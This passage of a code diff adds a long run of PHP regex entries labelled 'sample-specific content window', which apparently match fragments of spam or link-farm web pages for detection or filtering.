+    1198 => 
+    array (
+      'pattern' => '/rus Truesdale in the Yu\\-Gi\\-Oh\\! All the best Yu\\-Gi\\-Oh\\! games online for different retro emulators including GBA, Game Boy/s',
+      'label' => 'sample-specific content window',
+    ),
+    1199 => 
+    array (
+      'pattern' => '/iime\\-2view\\.  Title Location Workshop Dates; QIIME 2 @ One Health Summer School\\: University of Bern, Switzerland\\: Aug\\.  P/s',
+      'label' => 'sample-specific content window',
+    ),
+    1200 => 
+    array (
+      'pattern' => '/\\-plus\\-frp\\-unlock\\-without\\-pc\\.html\\>qv\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1201 => 
+    array (
+      'pattern' => '/href\\=http\\:\\/\\/myins\\.co\\.uk\\/ozcwz\\/2019\\-hino\\-268\\-specs\\.html\\>fz\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1202 => 
+    array (
+      'pattern' => '/l\\>zb\\<\\/a\\>, \\<a href\\=http\\:\\/\\/mercedeswrld\\.vip\\/hu8\\/powershell\\-for\\-android\\.html\\>bk\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1203 => 
+    array (
+      'pattern' => '/M4A\\] Red Velvet – RBB \\- The 5th Mini Album \\- EP \\[iTunes Plus AAC M4A\\] Red Velvet – RBB \\- The 5th Mini Album \\- EP M4A/s',
+      'label' => 'sample-specific content window',
+    ),
+    1204 => 
+    array (
+      'pattern' => '/neeraj\\-jhansi\\-bidai\\-song\\.html\\>ii\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1205 => 
+    array (
+      'pattern' => '/ves\\.com\\.mx\\/zfbsyvh\\/music\\-production\\-courses\\-reddit\\.html\\>u4\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1206 => 
+    array (
+      'pattern' => '/o\\-apk\\.html\\>id\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1207 => 
+    array (
+      'pattern' => '/43\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1208 => 
+    array (
+      'pattern' => '/c7\\<\\/a\\>, \\<a href\\=http\\:\\/\\/electricitybd\\.com\\/qpl\\/macos\\-mojave\\-vpn\\-server\\.html\\>cz\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1209 => 
+    array (
+      'pattern' => '/\\>qc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/xali\\.com\\.sg\\/zj1\\/df95\\-forum\\.html\\>0j\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1210 => 
+    array (
+      'pattern' => '/ly hasn&\\#39;t come up much if ever\\.  Wii U USB Helper allows you to download, backup and play games from the eShop serve/s',
+      'label' => 'sample-specific content window',
+    ),
+    1211 => 
+    array (
+      'pattern' => '/p\\:\\/\\/themillsfabrica\\.kcly\\.com\\/luiyy\\/amie\\-hicks\\-2018\\.html\\>iw\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1212 => 
+    array (
+      'pattern' => '/on 9anime\\. dynaman subbed\\<br\\>\\<br\\>
+
+
+
+\\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1213 => 
+    array (
+      'pattern' => '/\\-2015\\.html\\>lp\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1214 => 
+    array (
+      'pattern' => '/delphia Super Bowl Champions \\- Duration\\: 2\\:31\\.  Leading up to the big week, I’m going to show you ideas for a great Su/s',
+      'label' => 'sample-specific content window',
+    ),
+    1215 => 
+    array (
+      'pattern' => '/\\<\\!DOCTYPE html\\>
+
+\\<html prefix\\="content\\:  dc\\:  fo[\\s\\S]{0,12000}ich tests are required for teacher certification/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1216 => 
+    array (
+      'pattern' => '/swers\\.html\\>jw\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1217 => 
+    array (
+      'pattern' => '/m16a1\\-triangular\\-handguards\\.html\\>ja\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1218 => 
+    array (
+      'pattern' => '/c2305\\.html\\>fl\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1219 => 
+    array (
+      'pattern' => '/ver growing list of U\\.  It leads the best pocket knife 2018 review\\.  After looking in both lists with no luck that means/s',
+      'label' => 'sample-specific content window',
+    ),
+    1220 => 
+    array (
+      'pattern' => '/onal Version \\(Gold\\)\\: Unlocked Cell Phones \\- Amaz[\\s\\S]{0,12000}l\\>qf\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1221 => 
+    array (
+      'pattern' => '/\\/ivyk2\\/error\\-code\\-224003\\.html\\>ge\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1222 => 
+    array (
+      'pattern' => '/ecoorad\\.com\\/2auzwf\\/morgan\\-stanley\\-india\\-internship\\.html\\>rs\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1223 => 
+    array (
+      'pattern' => '/aload\\.html\\>5j\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1224 => 
+    array (
+      'pattern' => '/quest\\.html\\>dr\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1225 => 
+    array (
+      'pattern' => '/l8\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1226 => 
+    array (
+      'pattern' => '/appen\\.html\\>r0\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1227 => 
+    array (
+      'pattern' => '/f\\=http\\:\\/\\/alotofgoodthings\\.tk\\/iexdt\\/icom\\-panadapter\\.html\\>g6\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1228 => 
+    array (
+      'pattern' => '/lates\\.html\\>fk\\<\\/a\\>, \\<a href\\=http\\:\\/\\/kwnong\\.com\\/wmhhim\\/vba\\-trim\\-integer\\.html\\>4n\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1229 => 
+    array (
+      'pattern' => '/\\-mods\\.html\\>ib\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1230 => 
+    array (
+      'pattern' => '/7\\-sub\\.html\\>vs\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1231 => 
+    array (
+      'pattern' => '/hool\\-management\\-app\\-demo\\.html\\>zz\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1232 => 
+    array (
+      'pattern' => '/N Android Car Navigation Stereo \\- Dual Bluetooth[\\s\\S]{0,12000}\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1233 => 
+    array (
+      'pattern' => '/ad\\.com\\/2jti\\/2\\-yoga\\-poses\\.html\\>z8\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1234 => 
+    array (
+      'pattern' => '/allas\\-symphony\\-auditions\\.html\\>ek\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1235 => 
+    array (
+      'pattern' => '/a\\>, \\<a href\\=http\\:\\/\\/elhadetsport\\.com\\/xqzu0\\/brazilian\\-telenovelas\\-2018\\.html\\>z1\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1236 => 
+    array (
+      'pattern' => '/rkekyurtlari\\.com\\/2dp9li7\\/steam\\-web\\-helper\\-high\\-cpu\\.html\\>ag\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1237 => 
+    array (
+      'pattern' => '/q\\/romantic\\-hindi\\-songs\\-love\\.html\\>hv\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1238 => 
+    array (
+      'pattern' => '/92f\\/chrysler\\-0\\-financing\\.html\\>wa\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1239 => 
+    array (
+      'pattern' => '/e a calendar table\\: Calendar and Autocalendar\\.  \\- DaxStudio\\/DaxStudio DAX, or Data Analysis Expressions, is the language/s',
+      'label' => 'sample-specific content window',
+    ),
+    1240 => 
+    array (
+      'pattern' => '/jw\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1241 => 
+    array (
+      'pattern' => '/rgua\\/osc\\-controller\\-windows\\.html\\>wx\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1242 => 
+    array (
+      'pattern' => '/te\\-logs\\-to\\-elasticsearch\\.html\\>xz\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1243 => 
+    array (
+      'pattern' => '/ebe\\-lewes\\-de\\.html\\>db\\<\\/a\\>, \\<a href\\=http\\:\\/\\/ritravel\\.ma\\/vtze\\/dmt\\-dragon\\.html\\>vw\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1244 => 
+    array (
+      'pattern' => '/rmacia\\.costaservicios\\.com\\/439xgo\\/kobold\\-paladin\\-5e\\.html\\>31\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1245 => 
+    array (
+      'pattern' => '/riters\\.com\\/r5vbcge\\/history\\-of\\-pakistan\\-before\\-1947\\.html\\>kf\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1246 => 
+    array (
+      'pattern' => '/\\/8th\\-grade\\-science\\-textbook\\.html\\>rf\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1247 => 
+    array (
+      'pattern' => '/ney on your online purchases with our Uber promo[\\s\\S]{0,12000}v\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1248 => 
+    array (
+      'pattern' => '/heast\\.html\\>ld\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1249 => 
+    array (
+      'pattern' => '/stockx\\-london\\-office\\-address\\.html\\>cm\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1250 => 
+    array (
+      'pattern' => '/, \\<a href\\=http\\:\\/\\/xinranliu\\.com\\/91h\\/endometrial\\-hyperplasia\\-treatment\\.html\\>e9\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1251 => 
+    array (
+      'pattern' => '/\\-song\\.html\\>1u\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1252 => 
+    array (
+      'pattern' => '/x\\/mxgraph\\-parallel\\-edges\\.html\\>9x\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1253 => 
+    array (
+      'pattern' => '/xtream\\-codes\\-open\\-source\\.html\\>ue\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1254 => 
+    array (
+      'pattern' => '/fv\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1255 => 
+    array (
+      'pattern' => '/, \\<a href\\=http\\:\\/\\/taysyz\\.ir\\/nbpwk\\/ms\\-access\\-add\\-ins\\.html\\>fk\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1256 => 
+    array (
+      'pattern' => '/gksn\\.com\\.ua\\/v72ccq\\/t\\-sport\\-fairing\\-headlight\\-block\\.html\\>at\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1257 => 
+    array (
+      'pattern' => '/p\\/xerox\\-workcentre\\-3615\\-drum\\-cartridge\\-end\\-of\\-life\\.html\\>qm\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1258 => 
+    array (
+      'pattern' => '/urwcvq\\/xfer\\-records\\-wiki\\.html\\>3l\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1259 => 
+    array (
+      'pattern' => '/ns\\.com\\/t99\\/suzuki\\-ds80\\-parts\\.html\\>ri\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1260 => 
+    array (
+      'pattern' => '/\\.us\\/klf\\/english\\-iptv\\-usa\\-apk\\.html\\>9h\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1261 => 
+    array (
+      'pattern' => '/o run a Dungeons &amp; Dragons or other pen &amp; paper RPG, but aren’t sure where to start\\? You searched for\\: dnd elf/s',
+      'label' => 'sample-specific content window',
+    ),
+    1262 => 
+    array (
+      'pattern' => '/rs\\.  It is an XML\\-based \\(more precisely XAML\\-based\\) specification, based on a new print path \\(print&nbsp; Convert docume/s',
+      'label' => 'sample-specific content window',
+    ),
+    1263 => 
+    array (
+      'pattern' => '/ecipe\\.html\\>5p\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1264 => 
+    array (
+      'pattern' => '/ho unknowingly exposes sensitive corporate infor[\\s\\S]{0,12000}v\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1265 => 
+    array (
+      'pattern' => '/echnology product\\: proximate analysis analyzer \\/ carbon \\/ coal \\/ biomass SDTGA5000a\\.  However, it may be possible for us/s',
+      'label' => 'sample-specific content window',
+    ),
+    1266 => 
+    array (
+      'pattern' => '/family\\-doctor\\-louisville\\.html\\>np\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1267 => 
+    array (
+      'pattern' => '/tml\\>l2\\<\\/a\\>, \\<a href\\=http\\:\\/\\/lolipp\\.club\\/mkkfrxr\\/led\\-driver\\-calculator\\.html\\>nd\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1268 => 
+    array (
+      'pattern' => '/in their 2\\-year duration which has been published by punjab textbook board lahore\\.  With the passage of time, many senio/s',
+      'label' => 'sample-specific content window',
+    ),
+    1269 => 
+    array (
+      'pattern' => '/n\\/nikon\\-p900\\-firmware\\-update\\.html\\>gp\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1270 => 
+    array (
+      'pattern' => '/eader\\.html\\>re\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1271 => 
+    array (
